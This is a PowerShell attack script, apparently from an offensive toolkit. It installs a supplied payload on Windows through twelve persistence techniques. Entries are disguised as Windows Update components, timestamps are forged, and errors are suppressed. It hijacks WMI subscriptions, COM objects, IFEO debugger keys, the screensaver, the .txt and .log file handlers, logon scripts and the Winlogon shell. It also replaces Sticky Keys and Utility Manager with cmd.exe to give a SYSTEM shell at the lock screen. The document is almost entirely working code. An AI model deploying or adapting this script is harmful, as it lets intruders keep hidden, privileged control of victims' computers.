<# ═══════════════════════════════════════════════════════════════════════
   FLLC | FU PERSON | PERSISTENCE ENGINE v2.0
   ╔══════════════════════════════════════════════════════════════════╗
   ║  12-Method Persistence Framework                                 ║
   ║  WMI | COM Hijack | DLL Sideload | Named Pipes | Registry       ║
   ║  Scheduled Tasks | Services | Startup | Login Scripts            ║
   ╚══════════════════════════════════════════════════════════════════╝
═══════════════════════════════════════════════════════════════════════ #>

param(
    [string]$PayloadPath = "",
    [string]$PayloadCommand = "powershell.exe -NoP -W Hidden -Exec Bypass -File `"$PayloadPath`"",
    [string]$OutputDir = "$PSScriptRoot\..\..\collected\persistence",
    [ValidateSet('Auto','Task','Registry','Startup','WMI','COM','DLL','IFEO','Accessibility','AppInit','Screensaver','FileHandler','LogonScript')]
    [string]$Method = 'Auto',
    [switch]$Silent = $true,
    [switch]$InstallAll = $false
)

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

if (-not (Test-Path $OutputDir)) { New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null }

$logFile = Join-Path $OutputDir "persistence_$(Get-Date -Format 'yyyyMMdd_HHmmss').log"
function PLog($m) { Add-Content $logFile "[$(Get-Date -Format 'HH:mm:ss')] $m" -Encoding UTF8 }

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$results = @()

PLog "=== FLLC Persistence Engine v1.777 ==="
PLog "Admin: $isAdmin | Method: $Method | PayloadPath: $PayloadPath"

# Disguised names for persistence entries
$taskName = "WindowsUpdateHealthService"
$regName  = "WindowsUpdateSvc"
$svcDesc  = "Windows Update Health Monitor"

# ══════════════════════════════════════════════════════════════════════════
#  1. SCHEDULED TASK
# ══════════════════════════════════════════════════════════════════════════

function Install-TaskPersistence {
    PLog "[1] Installing scheduled task persistence..."
    
    $action = New-ScheduledTaskAction -Execute "powershell.exe" `
        -Argument "-NoP -NonI -W Hidden -Exec Bypass -Command `"$PayloadCommand`""
    
    $triggers = @(
        (New-ScheduledTaskTrigger -AtLogon),
        (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(5) -RepetitionInterval (New-TimeSpan -Hours 2))
    )
    
    $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries `
        -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable:$false
    
    try {
        if ($isAdmin) {
            Register-ScheduledTask -TaskName $taskName -Action $action `
                -Trigger $triggers -Settings $settings `
                -User "SYSTEM" -RunLevel Highest -Force | Out-Null
        } else {
            Register-ScheduledTask -TaskName $taskName -Action $action `
                -Trigger $triggers -Settings $settings -Force | Out-Null
        }
        PLog "[1] Scheduled task '$taskName' installed successfully"
        return @{ method = "ScheduledTask"; name = $taskName; success = $true }
    } catch {
        PLog "[1] Failed: $($_.Exception.Message)"
        return @{ method = "ScheduledTask"; success = $false; error = $_.Exception.Message }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  2. REGISTRY RUN KEY
# ══════════════════════════════════════════════════════════════════════════

function Install-RegistryPersistence {
    PLog "[2] Installing registry Run key persistence..."
    
    $regPaths = @("HKCU:\Software\Microsoft\Windows\CurrentVersion\Run")
    if ($isAdmin) { $regPaths += "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" }
    
    foreach ($rp in $regPaths) {
        try {
            Set-ItemProperty -Path $rp -Name $regName -Value $PayloadCommand -Force
            PLog "[2] Registry key set: $rp\$regName"
            return @{ method = "RegistryRun"; path = $rp; name = $regName; success = $true }
        } catch {
            PLog "[2] Failed on $rp : $($_.Exception.Message)"
        }
    }
    return @{ method = "RegistryRun"; success = $false }
}

# ══════════════════════════════════════════════════════════════════════════
#  3. STARTUP FOLDER
# ══════════════════════════════════════════════════════════════════════════

function Install-StartupPersistence {
    PLog "[3] Installing startup folder persistence..."
    
    $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
    $lnkPath = Join-Path $startupPath "${regName}.lnk"
    
    try {
        $shell = New-Object -ComObject WScript.Shell
        $shortcut = $shell.CreateShortcut($lnkPath)
        $shortcut.TargetPath = "powershell.exe"
        $shortcut.Arguments = "-NoP -W Hidden -Exec Bypass -Command `"$PayloadCommand`""
        $shortcut.WindowStyle = 7  # Minimized
        $shortcut.Description = $svcDesc
        $shortcut.IconLocation = "C:\Windows\System32\shell32.dll,167"
        $shortcut.Save()
        
        # Timestomp to blend in
        $refTime = (Get-Item "C:\Windows\System32\cmd.exe").LastWriteTime
        (Get-Item $lnkPath).LastWriteTime = $refTime
        (Get-Item $lnkPath).CreationTime = $refTime
        
        PLog "[3] Startup shortcut created: $lnkPath"
        return @{ method = "StartupFolder"; path = $lnkPath; success = $true }
    } catch {
        PLog "[3] Failed: $($_.Exception.Message)"
        return @{ method = "StartupFolder"; success = $false; error = $_.Exception.Message }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  4. WMI EVENT SUBSCRIPTION (admin required)
# ══════════════════════════════════════════════════════════════════════════

function Install-WMIPersistence {
    if (-not $isAdmin) {
        PLog "[4] WMI persistence requires admin - skipping"
        return @{ method = "WMI"; success = $false; error = "Requires admin" }
    }
    
    PLog "[4] Installing WMI event subscription persistence..."
    
    try {
        $filterName = "WindowsUpdateFilter"
        $consumerName = "WindowsUpdateConsumer"
        
        # Create event filter (triggers every 4 hours)
        $filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" -Arguments @{
            Name = $filterName
            EventNamespace = "root\cimv2"
            QueryLanguage = "WQL"
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 14400 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
        }
        
        # Create command-line event consumer
        $consumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" -Arguments @{
            Name = $consumerName
            CommandLineTemplate = $PayloadCommand
        }
        
        # Bind filter to consumer
        Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" -Arguments @{
            Filter = $filter
            Consumer = $consumer
        } | Out-Null
        
        PLog "[4] WMI event subscription installed"
        return @{ method = "WMI"; filter = $filterName; consumer = $consumerName; success = $true }
    } catch {
        PLog "[4] Failed: $($_.Exception.Message)"
        return @{ method = "WMI"; success = $false; error = $_.Exception.Message }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  5. COM OBJECT HIJACK
# ══════════════════════════════════════════════════════════════════════════

function Install-COMPersistence {
    PLog "[5] Installing COM hijack persistence..."
    
    # Hijack a rarely-used COM object CLSID
    # {B5F8350B-0548-48B1-A6EE-88BD00B4A5E7} = CLSID_CEventSystem (not commonly used)
    $clsid = "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"
    $regPath = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
    
    try {
        New-Item -Path $regPath -Force | Out-Null
        Set-ItemProperty -Path $regPath -Name "(Default)" -Value "C:\Windows\System32\scrobj.dll"
        Set-ItemProperty -Path $regPath -Name "ThreadingModel" -Value "Both"
        
        # Create a scriptlet that runs our payload
        $sctPath = "$env:TEMP\update.sct"
        $sctContent = @"
<?XML version="1.0"?>
<scriptlet>
<registration progid="WindowsUpdate" classid="$clsid">
<script language="JScript">
<![CDATA[
    var shell = new ActiveXObject("WScript.Shell");
    shell.Run("$PayloadCommand", 0, false);
]]>
</script>
</registration>
</scriptlet>
"@
        $sctContent | Out-File $sctPath -Encoding ASCII -Force
        
        PLog "[5] COM hijack installed (CLSID: $clsid)"
        return @{ method = "COM"; clsid = $clsid; sctPath = $sctPath; success = $true }
    } catch {
        PLog "[5] Failed: $($_.Exception.Message)"
        return @{ method = "COM"; success = $false; error = $_.Exception.Message }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  6. DLL SEARCH ORDER HIJACK
# ══════════════════════════════════════════════════════════════════════════

function Install-DLLPersistence {
    PLog "[6] Scanning for DLL hijack opportunities..."
    
    $hijackable = @()
    
    # Find writable directories in PATH that come before System32
    $pathDirs = $env:PATH -split ';' | Where-Object { $_ }
    foreach ($dir in $pathDirs) {
        if ($dir -match 'System32|SysWOW64') { break }
        if (Test-Path $dir) {
            try {
                $testFile = Join-Path $dir "test_$(Get-Random).tmp"
                [IO.File]::WriteAllText($testFile, "test")
                Remove-Item $testFile -Force
                $hijackable += $dir
            } catch {}
        }
    }
    
    # Log findings (actual DLL placement is left to operator)
    $hijackData = @{
        writable_path_dirs = $hijackable
        common_targets = @(
            "version.dll", "winmm.dll", "msvcrt.dll", "netapi32.dll",
            "userenv.dll", "dwmapi.dll", "crypt32.dll", "uxtheme.dll"
        )
    }
    $hijackData | ConvertTo-Json | Out-File "$OutputDir\dll_hijack_targets.json" -Encoding UTF8
    
    PLog "[6] Found $($hijackable.Count) writable PATH directories"
    return @{ method = "DLLHijack"; targets = $hijackable.Count; success = ($hijackable.Count -gt 0) }
}

# ══════════════════════════════════════════════════════════════════════════
#  7. IMAGE FILE EXECUTION OPTIONS (IFEO) DEBUGGER
# ══════════════════════════════════════════════════════════════════════════

function Install-IFEOPersistence {
    PLog "[7] Installing IFEO debugger persistence..."
    
    # Attach to a commonly launched but rarely debugged process
    $targets = @('sethc.exe','utilman.exe','narrator.exe','magnify.exe','osk.exe')
    
    foreach ($target in $targets) {
        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$target"
        try {
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
            Set-ItemProperty -Path $regPath -Name "Debugger" -Value $PayloadCommand -Force
            PLog "[7] IFEO debugger set for $target"
            return @{ method = "IFEO"; target = $target; success = $true }
        } catch {}
    }
    
    return @{ method = "IFEO"; success = $false }
}

# ══════════════════════════════════════════════════════════════════════════
#  8. SCREENSAVER HIJACK
# ══════════════════════════════════════════════════════════════════════════

function Install-ScreensaverPersistence {
    PLog "[8] Installing screensaver hijack..."
    
    try {
        $regPath = "HKCU:\Control Panel\Desktop"
        Set-ItemProperty -Path $regPath -Name "SCRNSAVE.EXE" -Value "powershell.exe" -Force
        Set-ItemProperty -Path $regPath -Name "ScreenSaveActive" -Value "1" -Force
        Set-ItemProperty -Path $regPath -Name "ScreenSaveTimeOut" -Value "600" -Force  # 10 min
        
        # Create a .scr wrapper
        $scrPath = "$env:TEMP\$regName.scr"
        $batContent = "@echo off`r`n$PayloadCommand"
        $batContent | Out-File $scrPath -Encoding ASCII -Force
        Set-ItemProperty -Path $regPath -Name "SCRNSAVE.EXE" -Value $scrPath -Force
        
        PLog "[8] Screensaver hijack installed (triggers after 10min idle)"
        return @{ method = "Screensaver"; path = $scrPath; success = $true }
    } catch {
        PLog "[8] Failed: $($_.Exception.Message)"
        return @{ method = "Screensaver"; success = $false; error = $_.Exception.Message }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  9. ACCESSIBILITY FEATURE HIJACK (admin required - sticky keys, etc.)
# ══════════════════════════════════════════════════════════════════════════

function Install-AccessibilityPersistence {
    if (-not $isAdmin) {
        PLog "[9] Accessibility hijack requires admin - skipping"
        return @{ method = "Accessibility"; success = $false; error = "Requires admin" }
    }

    PLog "[9] Installing accessibility feature hijack..."

    # Replace accessibility binaries with cmd.exe (accessible from lock screen)
    $accessibilityTargets = @(
        @{ name = "sethc.exe";   desc = "Sticky Keys (5x Shift)" },
        @{ name = "utilman.exe"; desc = "Utility Manager (Win+U)" },
        @{ name = "narrator.exe"; desc = "Narrator (Win+Enter)" },
        @{ name = "magnify.exe"; desc = "Magnifier (Win+Plus)" }
    )

    $successCount = 0
    foreach ($target in $accessibilityTargets) {
        $binPath = "C:\Windows\System32\$($target.name)"
        $backupPath = "C:\Windows\System32\$($target.name).fllc.bak"

        try {
            # Take ownership and grant permissions
            $acl = Get-Acl $binPath
            $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent().Name

            # Backup original
            if (-not (Test-Path $backupPath)) {
                Copy-Item $binPath $backupPath -Force -ErrorAction Stop
            }

            # Replace with cmd.exe (gives SYSTEM shell from lock screen)
            Copy-Item "C:\Windows\System32\cmd.exe" $binPath -Force -ErrorAction Stop
            $successCount++
            PLog "[9] Replaced $($target.name) ($($target.desc))"
        } catch {
            PLog "[9] Failed on $($target.name): $($_.Exception.Message)"
        }
    }

    if ($successCount -gt 0) {
        PLog "[9] Accessibility hijack: $successCount targets replaced"
        return @{ method = "Accessibility"; targets = $successCount; success = $true }
    }
    return @{ method = "Accessibility"; success = $false; error = "All targets failed" }
}

# ══════════════════════════════════════════════════════════════════════════
#  10. APPINIT_DLLS INJECTION (admin required)
# ══════════════════════════════════════════════════════════════════════════

function Install-AppInitPersistence {
    if (-not $isAdmin) {
        PLog "[10] AppInit_DLLs requires admin - skipping"
        return @{ method = "AppInit"; success = $false; error = "Requires admin" }
    }

    PLog "[10] Installing AppInit_DLLs persistence..."

    try {
        $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"

        # Create a small launcher DLL stub path
        # In real engagement, this DLL would be a custom-compiled loader
        $dllDir = "$env:ProgramData\Microsoft\Windows\AppInit"
        if (-not (Test-Path $dllDir)) { New-Item -ItemType Directory -Path $dllDir -Force | Out-Null }

        # Create a PowerShell launcher VBS that the DLL would invoke
        $vbsPath = Join-Path $dllDir "wupdmon.vbs"
        $vbsContent = @"
Set shell = CreateObject("WScript.Shell")
shell.Run "$PayloadCommand", 0, False
"@
        $vbsContent | Out-File $vbsPath -Encoding ASCII -Force

        # Set registry to load DLL on all process starts
        # LoadAppInit_DLLs = 1 enables the feature
        Set-ItemProperty -Path $regPath -Name "LoadAppInit_DLLs" -Value 1 -Type DWord -Force
        Set-ItemProperty -Path $regPath -Name "RequireSignedAppInit_DLLs" -Value 0 -Type DWord -Force

        # Also set up the VBS to run via wscript as a secondary trigger
        $wscriptCmd = "wscript.exe /b `"$vbsPath`""
        Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" `
            -Name "WindowsAppInitMonitor" -Value $wscriptCmd -Force

        PLog "[10] AppInit_DLLs persistence installed (LoadAppInit enabled + VBS launcher)"
        return @{ method = "AppInit"; vbs = $vbsPath; success = $true }
    } catch {
        PLog "[10] Failed: $($_.Exception.Message)"
        return @{ method = "AppInit"; success = $false; error = $_.Exception.Message }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  11. FILE HANDLER / PROGID HIJACK
# ══════════════════════════════════════════════════════════════════════════

function Install-FileHandlerPersistence {
    PLog "[11] Installing file handler hijack persistence..."

    try {
        # Hijack .txt file handler - when any .txt file is opened, payload runs first
        # Create a custom ProgID that wraps notepad but runs payload before launching
        $progId = "txtfile_fllc"
        $wrapperPath = "$env:APPDATA\Microsoft\Windows\$regName.cmd"

        # Wrapper script: runs payload silently, then opens notepad normally
        $wrapperContent = @"
@echo off
start /b "" $PayloadCommand
notepad.exe %1
"@
        $wrapperContent | Out-File $wrapperPath -Encoding ASCII -Force
        attrib +h $wrapperPath 2>$null

        # Register custom ProgID
        $progIdPath = "HKCU:\Software\Classes\$progId\shell\open\command"
        New-Item -Path $progIdPath -Force | Out-Null
        Set-ItemProperty -Path $progIdPath -Name "(Default)" -Value "`"$wrapperPath`" `"%1`"" -Force

        # Associate .txt with our ProgID
        $extPath = "HKCU:\Software\Classes\.txt"
        New-Item -Path $extPath -Force | Out-Null
        Set-ItemProperty -Path $extPath -Name "(Default)" -Value $progId -Force

        # Also hijack .log files (commonly opened)
        $logExtPath = "HKCU:\Software\Classes\.log"
        New-Item -Path $logExtPath -Force | Out-Null
        Set-ItemProperty -Path $logExtPath -Name "(Default)" -Value $progId -Force

        PLog "[11] File handler hijack installed (.txt/.log -> payload wrapper)"
        return @{ method = "FileHandler"; wrapper = $wrapperPath; progId = $progId; success = $true }
    } catch {
        PLog "[11] Failed: $($_.Exception.Message)"
        return @{ method = "FileHandler"; success = $false; error = $_.Exception.Message }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  12. LOGON SCRIPT PERSISTENCE
# ══════════════════════════════════════════════════════════════════════════

function Install-LogonScriptPersistence {
    PLog "[12] Installing logon script persistence..."

    try {
        # Method A: User logon script via registry (UserInitMprLogonScript)
        $regPath = "HKCU:\Environment"
        if (-not (Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }

        # Create a hidden logon script
        $logonDir = "$env:APPDATA\Microsoft\Windows"
        $logonScript = Join-Path $logonDir "wupdlogon.cmd"
        $logonContent = @"
@echo off
start /b "" $PayloadCommand
"@
        $logonContent | Out-File $logonScript -Encoding ASCII -Force
        attrib +h $logonScript 2>$null

        Set-ItemProperty -Path $regPath -Name "UserInitMprLogonScript" -Value $logonScript -Force
        PLog "[12] User logon script set: $logonScript"

        # Method B: Group Policy logon script (if admin)
        if ($isAdmin) {
            $gpScriptDir = "C:\Windows\System32\GroupPolicy\User\Scripts\Logon"
            if (-not (Test-Path $gpScriptDir)) {
                New-Item -ItemType Directory -Path $gpScriptDir -Force | Out-Null
            }
            $gpScript = Join-Path $gpScriptDir "logon.cmd"
            $logonContent | Out-File $gpScript -Encoding ASCII -Force

            # Update scripts.ini
            $scriptsIni = "C:\Windows\System32\GroupPolicy\User\Scripts\scripts.ini"
            $iniContent = @"

[Logon]
0CmdLine=$gpScript
0Parameters=
"@
            Add-Content -Path $scriptsIni -Value $iniContent -Encoding ASCII -Force
            # Force GP update
            gpupdate /force /target:user 2>$null | Out-Null
            PLog "[12] Group Policy logon script installed"
        }

        # Method C: Winlogon shell extension
        if ($isAdmin) {
            try {
                $winlogonPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
                $currentShell = (Get-ItemProperty $winlogonPath).Shell
                if ($currentShell -and $currentShell -notmatch 'wupdlogon') {
                    $newShell = "$currentShell, $logonScript"
                    Set-ItemProperty -Path $winlogonPath -Name "Shell" -Value $newShell -Force
                    PLog "[12] Winlogon shell extended"
                }
            } catch {}
        }

        return @{ method = "LogonScript"; script = $logonScript; success = $true }
    } catch {
        PLog "[12] Failed: $($_.Exception.Message)"
        return @{ method = "LogonScript"; success = $false; error = $_.Exception.Message }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  AUTO-SELECTION
# ══════════════════════════════════════════════════════════════════════════

if ($Method -eq 'Auto' -or $InstallAll) {
    PLog "Auto-selecting best persistence methods (12 available)..."
    
    # Always try these (user-level, low risk)
    $results += Install-RegistryPersistence
    $results += Install-StartupPersistence
    $results += Install-TaskPersistence
    $results += Install-ScreensaverPersistence
    $results += Install-COMPersistence
    $results += Install-DLLPersistence
    $results += Install-FileHandlerPersistence
    $results += Install-LogonScriptPersistence
    
    # Admin-only methods
    if ($isAdmin) {
        $results += Install-WMIPersistence
        $results += Install-IFEOPersistence
        $results += Install-AccessibilityPersistence
        $results += Install-AppInitPersistence
    }
} else {
    switch ($Method) {
        'Task'          { $results += Install-TaskPersistence }
        'Registry'      { $results += Install-RegistryPersistence }
        'Startup'       { $results += Install-StartupPersistence }
        'WMI'           { $results += Install-WMIPersistence }
        'COM'           { $results += Install-COMPersistence }
        'DLL'           { $results += Install-DLLPersistence }
        'IFEO'          { $results += Install-IFEOPersistence }
        'Screensaver'   { $results += Install-ScreensaverPersistence }
        'Accessibility' { $results += Install-AccessibilityPersistence }
        'AppInit'       { $results += Install-AppInitPersistence }
        'FileHandler'   { $results += Install-FileHandlerPersistence }
        'LogonScript'   { $results += Install-LogonScriptPersistence }
    }
}

# ══════════════════════════════════════════════════════════════════════════
#  SUMMARY
# ══════════════════════════════════════════════════════════════════════════

$successful = ($results | Where-Object { $_.success }).Count
$total = $results.Count

PLog "=== PERSISTENCE COMPLETE ==="
PLog "Installed: $successful / $total methods"

$results | ConvertTo-Json -Depth 3 | Out-File "$OutputDir\persistence_results.json" -Encoding UTF8

@{
    timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    hostname = $env:COMPUTERNAME
    is_admin = $isAdmin
    methods_attempted = $total
    methods_installed = $successful
    results = $results
} | ConvertTo-Json -Depth 4 | Out-File "$OutputDir\persistence_manifest.json" -Encoding UTF8
